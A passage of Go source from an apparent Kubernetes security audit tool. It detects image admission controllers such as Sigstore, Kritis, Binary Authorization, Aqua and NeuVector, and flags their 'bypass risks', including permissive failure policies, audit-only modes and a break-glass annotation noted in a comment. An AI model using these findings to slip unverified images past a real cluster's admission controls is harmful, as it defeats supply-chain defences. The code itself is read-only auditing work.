		controller.Status = "webhook-misconfigured"
		controller.BypassRisk = "Webhook does not target workload resources"
		return controller, policies
	}

	// Verify Kritis pods are running
	podsRunning, podStatus := verifyPodsRunning(ctx, clientset, []string{"kritis", "kritis-system"}, "app=kritis")
	if !podsRunning {
		podsRunning, podStatus = verifyPodsRunning(ctx, clientset, []string{"kritis", "kritis-system"}, "app.kubernetes.io/name=kritis")
	}
	if !podsRunning {
		controller.Status = "not-running"
		controller.BypassRisk = fmt.Sprintf("Controller pods not running: %s", podStatus)
		return controller, policies
	}

	controller.Status = "active"

	// Get ImageSecurityPolicies
	ispGVR := schema.GroupVersionResource{
		Group:    "kritis.grafeas.io",
		Version:  "v1beta1",
		Resource: "imagesecuritypolicies",
	}

	ispList, err := dynClient.Resource(ispGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, isp := range ispList.Items {
			policy := KritisPolicy{
				Name:      isp.GetName(),
				Namespace: isp.GetNamespace(),
			}

			// Check for attestation requirements
			if reqs, ok, _ := unstructured.NestedSlice(isp.Object, "spec", "attestationAuthorityName"); ok {
				for _, req := range reqs {
					if reqStr, ok := req.(string); ok {
						policy.RequiredAttestors = append(policy.RequiredAttestors, reqStr)
					}
				}
			}

			// Check for default allow
			if defaultAllow, ok, _ := unstructured.NestedBool(isp.Object, "spec", "imageAllowlist"); ok {
				policy.DefaultAllow = defaultAllow
			}

			policies = append(policies, policy)
			controller.PolicyCount++
		}
	}

	controller.SignatureReqs = true

	// Check for bypass risks
	hasDefaultAllow := false
	for _, p := range policies {
		if p.DefaultAllow {
			hasDefaultAllow = true
			break
		}
	}

	if controller.PolicyCount == 0 {
		controller.BypassRisk = "No ImageSecurityPolicies configured"
	} else if hasDefaultAllow {
		controller.BypassRisk = "Policy has imageAllowlist enabled - images can bypass attestation"
	} else if controller.FailurePolicy == "Ignore" {
		controller.BypassRisk = "FailurePolicy=Ignore allows bypass during controller failures"
	}

	return controller, policies
}

// analyzeImagePolicyWebhook analyzes built-in ImagePolicyWebhook
func analyzeImagePolicyWebhook(ctx context.Context, dynClient dynamic.Interface) ImageAdmissionController {
	controller := ImageAdmissionController{}

	// ImagePolicyWebhook is configured via API server flags, not CRDs
	// We can only detect it by looking for specific webhook patterns

	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	var webhookFound bool
	var whObject map[string]interface{}
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			if strings.Contains(strings.ToLower(name), "imagepolicy") ||
				strings.Contains(strings.ToLower(name), "image-policy") {
				controller.Name = "ImagePolicyWebhook"
				controller.Type = "imagepolicywebhook"
				controller.WebhookName = name
				webhookFound = true
				whObject = wh.Object

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller
	}

	// Verify webhook targets workloads
	if !webhookTargetsWorkloads(whObject) {
		controller.Status = "webhook-misconfigured"
		controller.BypassRisk = "Webhook does not target workload resources"
		return controller
	}

	controller.Status = "active"

	// Check for bypass risks
	if controller.FailurePolicy == "Ignore" {
		controller.BypassRisk = "FailurePolicy=Ignore allows bypass during controller failures"
	}

	return controller
}

// analyzeImagePolicyEngines analyzes policy engines for image-related rules
func analyzeImagePolicyEngines(ctx context.Context, dynClient dynamic.Interface) []ImagePolicyFinding {
	var findings []ImagePolicyFinding

	// Check Kyverno for image policies
	cpGVR := schema.GroupVersionResource{
		Group:    "kyverno.io",
		Version:  "v1",
		Resource: "clusterpolicies",
	}

	cpList, err := dynClient.Resource(cpGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, cp := range cpList.Items {
			name := cp.GetName()
			nameLC := strings.ToLower(name)

			// Check if policy name suggests image-related
			if strings.Contains(nameLC, "image") ||
				strings.Contains(nameLC, "registry") ||
				strings.Contains(nameLC, "container") ||
				strings.Contains(nameLC, "digest") ||
				strings.Contains(nameLC, "tag") {

				// Get validation failure action
				action := "Audit"
				if vfa, ok, _ := unstructured.NestedString(cp.Object, "spec", "validationFailureAction"); ok {
					action = vfa
				}

				bypassRisk := ""
				if strings.ToLower(action) == "audit" {
					bypassRisk = "Audit only"
				}

				findings = append(findings, ImagePolicyFinding{
					Controller: "Kyverno",
					PolicyName: name,
					Scope:      "Cluster",
					Policy:     action,
					BypassRisk: bypassRisk,
				})
			}
		}
	}

	// Check Gatekeeper for image-related constraints
	ctGVR := schema.GroupVersionResource{
		Group:    "templates.gatekeeper.sh",
		Version:  "v1",
		Resource: "constrainttemplates",
	}

	ctList, err := dynClient.Resource(ctGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, ct := range ctList.Items {
			name := ct.GetName()
			nameLC := strings.ToLower(name)

			// Check if template is image-related
			if strings.Contains(nameLC, "image") ||
				strings.Contains(nameLC, "registry") ||
				strings.Contains(nameLC, "container") ||
				strings.Contains(nameLC, "allowedrepos") ||
				strings.Contains(nameLC, "digest") {

				// Get the CRD kind
				kind := ""
				if crd, ok, _ := unstructured.NestedMap(ct.Object, "spec", "crd", "spec", "names"); ok {
					if k, ok := crd["kind"].(string); ok {
						kind = k
					}
				}

				if kind != "" {
					// Look for constraints of this type
					constraintGVR := schema.GroupVersionResource{
						Group:    "constraints.gatekeeper.sh",
						Version:  "v1beta1",
						Resource: strings.ToLower(kind),
					}

					constraintList, err := dynClient.Resource(constraintGVR).List(ctx, metav1.ListOptions{})
					if err == nil {
						for _, c := range constraintList.Items {
							action := "deny"
							if ea, ok, _ := unstructured.NestedString(c.Object, "spec", "enforcementAction"); ok {
								action = ea
							}

							bypassRisk := ""
							if action == "dryrun" || action == "warn" {
								bypassRisk = fmt.Sprintf("%s mode", action)
							}

							findings = append(findings, ImagePolicyFinding{
								Controller: "Gatekeeper",
								PolicyName: fmt.Sprintf("%s/%s", kind, c.GetName()),
								Scope:      "Cluster",
								Policy:     action,
								BypassRisk: bypassRisk,
							})
						}
					}
				}
			}
		}
	}

	return findings
}

// analyzeSigstorePolicyController analyzes Sigstore Policy Controller
func analyzeSigstorePolicyController(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []SigstorePolicy) {
	controller := ImageAdmissionController{}
	var policies []SigstorePolicy

	// Check for Sigstore Policy Controller webhook
	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	var webhookFound bool
	var whObject map[string]interface{}
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			if strings.Contains(strings.ToLower(name), "sigstore") ||
				strings.Contains(strings.ToLower(name), "policy-controller") ||
				strings.Contains(strings.ToLower(name), "cosign") {
				controller.Name = "Sigstore Policy Controller"
				controller.Type = "sigstore"
				controller.WebhookName = name
				webhookFound = true
				whObject = wh.Object

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify webhook targets workloads
	if !webhookTargetsWorkloads(whObject) {
		controller.Status = "webhook-misconfigured"
		controller.BypassRisk = "Webhook does not target workload resources"
		return controller, policies
	}

	// Verify Sigstore Policy Controller pods are running
	podsRunning, podStatus := verifyPodsRunning(ctx, clientset, []string{"cosign-system", "sigstore-system", "policy-controller-system"}, "app=policy-controller")
	if !podsRunning {
		podsRunning, podStatus = verifyPodsRunning(ctx, clientset, []string{"cosign-system", "sigstore-system"}, "control-plane=policy-controller")
	}
	if !podsRunning {
		controller.Status = "not-running"
		controller.BypassRisk = fmt.Sprintf("Controller pods not running: %s", podStatus)
		return controller, policies
	}

	controller.Status = "active"

	// Get ClusterImagePolicies (policy.sigstore.dev)
	cipGVR := schema.GroupVersionResource{
		Group:    "policy.sigstore.dev",
		Version:  "v1beta1",
		Resource: "clusterimagepolicies",
	}

	cipList, err := dynClient.Resource(cipGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, cip := range cipList.Items {
			policy := SigstorePolicy{
				Name: cip.GetName(),
			}

			// Get images
			if images, ok, _ := unstructured.NestedSlice(cip.Object, "spec", "images"); ok {
				for _, img := range images {
					if imgMap, ok := img.(map[string]interface{}); ok {
						if glob, ok := imgMap["glob"].(string); ok {
							policy.Images = append(policy.Images, glob)
						}
					}
				}
			}

			// Get authorities
			if authorities, ok, _ := unstructured.NestedSlice(cip.Object, "spec", "authorities"); ok {
				for _, auth := range authorities {
					if authMap, ok := auth.(map[string]interface{}); ok {
						if name, ok := authMap["name"].(string); ok {
							policy.Authorities = append(policy.Authorities, name)
						}
						// Check for keyless
						if _, hasKeyless := authMap["keyless"]; hasKeyless {
							policy.KeylessEnabled = true
						}
						// Check for key
						if key, ok := authMap["key"].(map[string]interface{}); ok {
							if secretRef, ok := key["secretRef"].(map[string]interface{}); ok {
								if keyName, ok := secretRef["name"].(string); ok {
									policy.KeyRefs = append(policy.KeyRefs, keyName)
								}
							}
						}
						// Check for attestations (SLSA/in-toto verification)
						if attestations, ok := authMap["attestations"].([]interface{}); ok && len(attestations) > 0 {
							policy.AttestationsEnabled = true
							for _, att := range attestations {
								if attMap, ok := att.(map[string]interface{}); ok {
									if name, ok := attMap["name"].(string); ok {
										policy.AttestationTypes = append(policy.AttestationTypes, name)
									}
									// Check predicateType for SLSA
									if predicateType, ok := attMap["predicateType"].(string); ok {
										if strings.Contains(strings.ToLower(predicateType), "slsa") {
											if !containsString(policy.AttestationTypes, "slsa") {
												policy.AttestationTypes = append(policy.AttestationTypes, "slsa")
											}
										} else if strings.Contains(strings.ToLower(predicateType), "in-toto") ||
											strings.Contains(strings.ToLower(predicateType), "intoto") {
											if !containsString(policy.AttestationTypes, "in-toto") {
												policy.AttestationTypes = append(policy.AttestationTypes, "in-toto")
											}
										} else if strings.Contains(strings.ToLower(predicateType), "spdx") {
											if !containsString(policy.AttestationTypes, "spdx-sbom") {
												policy.AttestationTypes = append(policy.AttestationTypes, "spdx-sbom")
											}
										} else if strings.Contains(strings.ToLower(predicateType), "cyclonedx") {
											if !containsString(policy.AttestationTypes, "cyclonedx-sbom") {
												policy.AttestationTypes = append(policy.AttestationTypes, "cyclonedx-sbom")
											}
										}
									}
								}
							}
						}
					}
				}
			}

			// Get mode
			if mode, ok, _ := unstructured.NestedString(cip.Object, "spec", "mode"); ok {
				policy.Mode = mode
			}

			policies = append(policies, policy)
			controller.PolicyCount++
		}
	}

	// Try v1alpha1 as well
	cipGVRv1alpha1 := schema.GroupVersionResource{
		Group:    "policy.sigstore.dev",
		Version:  "v1alpha1",
		Resource: "clusterimagepolicies",
	}

	cipListv1alpha1, err := dynClient.Resource(cipGVRv1alpha1).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, cip := range cipListv1alpha1.Items {
			policy := SigstorePolicy{
				Name: cip.GetName(),
			}

			if images, ok, _ := unstructured.NestedSlice(cip.Object, "spec", "images"); ok {
				for _, img := range images {
					if imgMap, ok := img.(map[string]interface{}); ok {
						if glob, ok := imgMap["glob"].(string); ok {
							policy.Images = append(policy.Images, glob)
						}
					}
				}
			}

			policies = append(policies, policy)
			controller.PolicyCount++
		}
	}

	controller.SignatureReqs = true

	// Check for bypass risks
	warnModeFound := false
	for _, p := range policies {
		if strings.ToLower(p.Mode) == "warn" {
			warnModeFound = true
			break
		}
	}

	if controller.PolicyCount == 0 {
		controller.BypassRisk = "No ClusterImagePolicies configured"
	} else if warnModeFound {
		controller.BypassRisk = "Policy in warn mode - violations are logged but not blocked"
	} else if controller.FailurePolicy == "Ignore" {
		controller.BypassRisk = "FailurePolicy=Ignore allows bypass during controller failures"
	}

	return controller, policies
}

// analyzeGCPBinaryAuthorization checks for GCP Binary Authorization
func analyzeGCPBinaryAuthorization(ctx context.Context, dynClient dynamic.Interface) ImageAdmissionController {
	controller := ImageAdmissionController{}

	// Check for Binary Authorization webhook (via Kritis, ImagePolicyWebhook, or direct)
	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	var webhookFound bool
	var whObject map[string]interface{}
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			nameLC := strings.ToLower(name)

			// Check for various Binary Authorization webhook patterns
			isBinAuth := strings.Contains(nameLC, "binaryauthorization") ||
				strings.Contains(nameLC, "binary-authorization") ||
				strings.Contains(nameLC, "binauthz")

			// Also detect the ImagePolicyWebhook used by GCP Binary Authorization
			isImagePolicyWebhook := strings.Contains(nameLC, "imagepolicywebhook") ||
				name == "imagepolicywebhook.image-policy.k8s.io"

			// Check webhook service for GCP Binary Auth endpoints
			isGCPService := false
			if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok {
				for _, webhook := range webhooks {
					if whMap, ok := webhook.(map[string]interface{}); ok {
						if clientConfig, ok := whMap["clientConfig"].(map[string]interface{}); ok {
							if url, ok := clientConfig["url"].(string); ok {
								if strings.Contains(url, "binaryauthorization.googleapis.com") ||
									strings.Contains(url, "container.googleapis.com") {
									isGCPService = true
								}
							}
							if service, ok := clientConfig["service"].(map[string]interface{}); ok {
								if svcName, ok := service["name"].(string); ok {
									if strings.Contains(strings.ToLower(svcName), "binauthz") ||
										strings.Contains(strings.ToLower(svcName), "binary-auth") {
										isGCPService = true
									}
								}
							}
						}
					}
				}
			}

			if isBinAuth || isImagePolicyWebhook || isGCPService {
				controller.Name = "GCP Binary Authorization"
				controller.Type = "gcp-binauth"
				controller.WebhookName = name
				webhookFound = true
				whObject = wh.Object
				controller.SignatureReqs = true

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller
	}

	// Verify webhook targets workloads
	if !webhookTargetsWorkloads(whObject) {
		controller.Status = "webhook-misconfigured"
		controller.BypassRisk = "Webhook does not target workload resources"
		return controller
	}

	controller.Status = "active"

	// Check for bypass risks
	if controller.FailurePolicy == "Ignore" {
		controller.BypassRisk = "FailurePolicy=Ignore allows bypass during controller failures"
	}

	// Binary Authorization in GKE is cluster-level and managed via GCP console/gcloud
	// Note: Break-glass annotation can bypass: alpha.image-policy.k8s.io/break-glass: "true"
	controller.PolicyCount = 1 // Indicate there's a policy even if we can't enumerate it

	return controller
}

// analyzeAquaSecurity detects Aqua Security admission controller
func analyzeAquaSecurity(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []AquaSecurityPolicy) {
	controller := ImageAdmissionController{}
	var policies []AquaSecurityPolicy

	// Check for Aqua webhook
	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	webhookFound := false
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			nameLC := strings.ToLower(name)
			if strings.Contains(nameLC, "aqua") || strings.Contains(nameLC, "kube-enforcer") {
				// Verify webhook targets pods/deployments
				if !webhookTargetsWorkloads(wh.Object) {
					continue
				}
				webhookFound = true
				controller.Name = "Aqua Security"
				controller.Type = "aqua"
				controller.WebhookName = name
				controller.SignatureReqs = true
				controller.VulnScanning = true

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify Aqua pods are running (kube-enforcer namespace or aqua namespace)
	podsRunning := false
	imageVerified := false
	for _, ns := range []string{"aqua", "aqua-security", "kube-enforcer"} {
		pods, err := clientset.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{})
		if err == nil && len(pods.Items) > 0 {
			for _, pod := range pods.Items {
				if pod.Status.Phase == "Running" {
					podsRunning = true
					controller.Namespace = ns
					// Verify images
					for _, container := range pod.Spec.Containers {
						if verifyImageAdmissionImage(container.Image, "aqua") {
							imageVerified = true
						}
					}
					break
				}
			}
		}
		if podsRunning {
			break
		}
	}

	if podsRunning {
		controller.Status = "active"
		controller.ImageVerified = imageVerified
	} else {
		controller.Status = "webhook-only"
		controller.BypassRisk = "Webhook exists but no running pods found"
	}

	// Check for Aqua CRDs (ClusterConfigAuditReports, etc.)
	aquaGVR := schema.GroupVersionResource{
		Group:    "aquasecurity.github.io",
		Version:  "v1alpha1",
		Resource: "clusterconfigauditreports",
	}

	reports, err := dynClient.Resource(aquaGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		controller.PolicyCount = len(reports.Items)
	}

	return controller, policies
}

// analyzePrismaCloud detects Prisma Cloud (Twistlock) admission controller
func analyzePrismaCloud(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []PrismaCloudPolicy) {
	controller := ImageAdmissionController{}
	var policies []PrismaCloudPolicy

	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	webhookFound := false
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			nameLC := strings.ToLower(name)
			if strings.Contains(nameLC, "twistlock") || strings.Contains(nameLC, "prisma") ||
				strings.Contains(nameLC, "pcc-") || strings.Contains(nameLC, "prismacloud") {
				if !webhookTargetsWorkloads(wh.Object) {
					continue
				}
				webhookFound = true
				controller.Name = "Prisma Cloud"
				controller.Type = "prisma"
				controller.WebhookName = name
				controller.VulnScanning = true

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify Twistlock/Prisma pods are running and verify images
	podsRunning, ns, imageVerified := verifyPodsRunningWithImage(ctx, clientset,
		[]string{"twistlock", "prisma-cloud", "pcc"}, "", "prisma")

	if podsRunning {
		controller.Status = "active"
		controller.Namespace = ns
		controller.ImageVerified = imageVerified
	} else {
		controller.Status = "webhook-only"
		controller.BypassRisk = "Webhook exists but no running pods found"
	}

	// Check for Defender DaemonSet as additional verification
	for _, ns := range []string{"twistlock", "prisma-cloud", "pcc"} {
		ds, err := clientset.AppsV1().DaemonSets(ns).List(ctx, metav1.ListOptions{})
		if err == nil && len(ds.Items) > 0 {
			controller.PolicyCount = len(ds.Items)
			break
		}
	}

	return controller, policies
}

// analyzeSysdigSecure detects Sysdig Secure admission controller
func analyzeSysdigSecure(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []SysdigSecurePolicy) {
	controller := ImageAdmissionController{}
	var policies []SysdigSecurePolicy

	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	webhookFound := false
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			nameLC := strings.ToLower(name)
			if strings.Contains(nameLC, "sysdig") || strings.Contains(nameLC, "secure-scanning") {
				if !webhookTargetsWorkloads(wh.Object) {
					continue
				}
				webhookFound = true
				controller.Name = "Sysdig Secure"
				controller.Type = "sysdig"
				controller.WebhookName = name
				controller.VulnScanning = true

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify Sysdig pods are running
	podsRunning, ns := verifyPodsRunning(ctx, clientset,
		[]string{"sysdig-agent", "sysdig", "sysdig-admission-controller"}, "")

	if podsRunning {
		controller.Status = "active"
		controller.Namespace = ns
	} else {
		controller.Status = "webhook-only"
		controller.BypassRisk = "Webhook exists but no running pods found"
	}

	return controller, policies
}

// analyzeNeuVector detects NeuVector admission controller
func analyzeNeuVector(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []NeuVectorPolicy) {
	controller := ImageAdmissionController{}
	var policies []NeuVectorPolicy

	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	webhookFound := false
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			nameLC := strings.ToLower(name)
			if strings.Contains(nameLC, "neuvector") || strings.Contains(nameLC, "nv-") {
				if !webhookTargetsWorkloads(wh.Object) {
					continue
				}
				webhookFound = true
				controller.Name = "NeuVector"
				controller.Type = "neuvector"
				controller.WebhookName = name
				controller.VulnScanning = true

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify NeuVector pods are running
	podsRunning, ns := verifyPodsRunning(ctx, clientset, []string{"neuvector"}, "")

	if podsRunning {
		controller.Status = "active"
		controller.Namespace = ns
	} else {
		controller.Status = "webhook-only"
		controller.BypassRisk = "Webhook exists but no running pods found"
	}

	// Check for NeuVector CRDs (required for policy verification)
	nvAdmissionGVR := schema.GroupVersionResource{
		Group:    "neuvector.com",
		Version:  "v1",
		Resource: "nvadmissioncontrolsecurityrules",
	}

	ruleList, err := dynClient.Resource(nvAdmissionGVR).List(ctx, metav1.ListOptions{})
	if err == nil && len(ruleList.Items) > 0 {
		for _, rule := range ruleList.Items {
			policy := NeuVectorPolicy{
				Name:    rule.GetName(),
				Enabled: true,
			}

			if mode, ok, _ := unstructured.NestedString(rule.Object, "spec", "mode"); ok {
				policy.Mode = mode
				// Monitor mode doesn't block
				if strings.ToLower(mode) == "monitor" {
					controller.BypassRisk = "Mode is Monitor (not blocking)"
				}
			}

			policies = append(policies, policy)
			controller.PolicyCount++
		}
	} else if controller.Status == "active" {
		// Webhook exists, pods running, but no CRD policies
		controller.BypassRisk = "No admission control rules configured"
	}

	return controller, policies
}

// analyzeStackRox detects StackRox/Red Hat ACS admission controller
func analyzeStackRox(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []StackRoxPolicy) {
	controller := ImageAdmissionController{}
	var policies []StackRoxPolicy

	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	webhookFound := false
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			nameLC := strings.ToLower(name)
			if strings.Contains(nameLC, "stackrox") || strings.Contains(nameLC, "rhacs") ||
				strings.Contains(nameLC, "acs-") {
				if !webhookTargetsWorkloads(wh.Object) {
					continue
				}
				webhookFound = true
				controller.Name = "StackRox/Red Hat ACS"
				controller.Type = "stackrox"
				controller.WebhookName = name
				controller.VulnScanning = true

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	// Also check via labels
	if !webhookFound && whList != nil {
		for _, wh := range whList.Items {
			if labels := wh.GetLabels(); labels != nil {
				if name, ok := labels["app.kubernetes.io/name"]; ok {
					if strings.Contains(name, "stackrox") || strings.Contains(name, "acs") {
						if webhookTargetsWorkloads(wh.Object) {
							webhookFound = true
							controller.Name = "StackRox/Red Hat ACS"
							controller.Type = "stackrox"
							controller.WebhookName = wh.GetName()
							controller.VulnScanning = true
							break
						}
					}
				}
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify StackRox pods are running
	podsRunning, ns := verifyPodsRunning(ctx, clientset,
		[]string{"stackrox", "rhacs-operator"}, "")

	if podsRunning {
		controller.Status = "active"
		controller.Namespace = ns
	} else {
		controller.Status = "webhook-only"
		controller.BypassRisk = "Webhook exists but no running pods found"
	}

	// Check for admission-control deployment specifically
	for _, ns := range []string{"stackrox", "rhacs-operator"} {
		deploy, err := clientset.AppsV1().Deployments(ns).Get(ctx, "admission-control", metav1.GetOptions{})
		if err == nil && deploy.Status.ReadyReplicas > 0 {
			controller.Status = "active"
			controller.PolicyCount++
		}
	}

	return controller, policies
}

// analyzeSnykContainer detects Snyk Container admission controller
func analyzeSnykContainer(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []SnykContainerPolicy) {
	controller := ImageAdmissionController{}
	var policies []SnykContainerPolicy

	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	webhookFound := false
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			nameLC := strings.ToLower(name)
			if strings.Contains(nameLC, "snyk") {
				if !webhookTargetsWorkloads(wh.Object) {
					continue
				}
				webhookFound = true
				controller.Name = "Snyk Container"
				controller.Type = "snyk"
				controller.WebhookName = name
				controller.VulnScanning = true

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify Snyk pods are running
	podsRunning, ns := verifyPodsRunning(ctx, clientset,
		[]string{"snyk-monitor", "snyk"}, "")

	if podsRunning {
		controller.Status = "active"
		controller.Namespace = ns
	} else {
		controller.Status = "webhook-only"
		controller.BypassRisk = "Webhook exists but no running pods found"
	}

	return controller, policies
}

// analyzeAnchore detects Anchore Enterprise admission controller
func analyzeAnchore(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []AnchorePolicy) {
	controller := ImageAdmissionController{}
	var policies []AnchorePolicy

	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	webhookFound := false
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			nameLC := strings.ToLower(name)
			if strings.Contains(nameLC, "anchore") || strings.Contains(nameLC, "grype") {
				if !webhookTargetsWorkloads(wh.Object) {
					continue
				}
				webhookFound = true
				controller.Name = "Anchore Enterprise"
				controller.Type = "anchore"
				controller.WebhookName = name
				controller.VulnScanning = true

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify Anchore pods are running
	podsRunning, ns := verifyPodsRunning(ctx, clientset,
		[]string{"anchore", "anchore-engine"}, "")

	if podsRunning {
		controller.Status = "active"
		controller.Namespace = ns
	} else {
		controller.Status = "webhook-only"
		controller.BypassRisk = "Webhook exists but no running pods found"
	}

	return controller, policies
}

// analyzeTrivyOperator detects Trivy Operator
func analyzeTrivyOperator(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []TrivyOperatorPolicy) {
	controller := ImageAdmissionController{}
	var policies []TrivyOperatorPolicy

	// First check for Trivy Operator pods
	podsRunning, ns, imageVerified := verifyPodsRunningWithImage(ctx, clientset,
		[]string{"trivy-system", "trivy-operator", "trivy"}, "", "trivy")

	// Check for Trivy Operator CRDs (VulnerabilityReports)
	vrGVR := schema.GroupVersionResource{
		Group:    "aquasecurity.github.io",
		Version:  "v1alpha1",
		Resource: "vulnerabilityreports",
	}

	vrList, err := dynClient.Resource(vrGVR).List(ctx, metav1.ListOptions{})
	hasVulnReports := err == nil && len(vrList.Items) > 0

	// Check for webhook (trivy-operator can have admission webhook)
	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	hasWebhook := false
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			nameLC := strings.ToLower(name)
			if strings.Contains(nameLC, "trivy") {
